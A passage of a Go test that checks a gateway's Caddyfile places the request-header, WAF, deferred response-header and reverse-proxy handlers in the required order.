	for _, srv := range parsed.Apps.HTTP.Servers {
		collect(srv.Routes)
	}

	reqHdrIdx, wafIdx, respHdrIdx, proxyIdx := -1, -1, -1, -1
	for i, h := range ordered {
		switch h["handler"] {
		case "headers":
			if req, ok := h["request"].(map[string]any); ok && len(req) > 0 && reqHdrIdx < 0 {
				reqHdrIdx = i
			}
			if resp, ok := h["response"].(map[string]any); ok {
				if deferred, _ := resp["deferred"].(bool); deferred && respHdrIdx < 0 {
					respHdrIdx = i
				}
			}
		case "waf":
			if wafIdx < 0 {
				wafIdx = i
			}
		case "reverse_proxy":
			if proxyIdx < 0 {
				proxyIdx = i
			}
		}
	}
	if reqHdrIdx < 0 || wafIdx < 0 || respHdrIdx < 0 || proxyIdx < 0 {
		t.Fatalf("missing handlers in adapted Caddyfile: reqHdr=%d waf=%d deferredRespHdr=%d proxy=%d\nadapted=%s",
			reqHdrIdx, wafIdx, respHdrIdx, proxyIdx, string(adapted))
	}
	if !(reqHdrIdx < wafIdx && wafIdx < respHdrIdx && respHdrIdx < proxyIdx) {
		t.Fatalf("invalid handler order in gateway/configs/Caddyfile: want request_header(%d) < waf(%d) < deferred_header(%d) < reverse_proxy(%d)",
			reqHdrIdx, wafIdx, respHdrIdx, proxyIdx)
	}
}
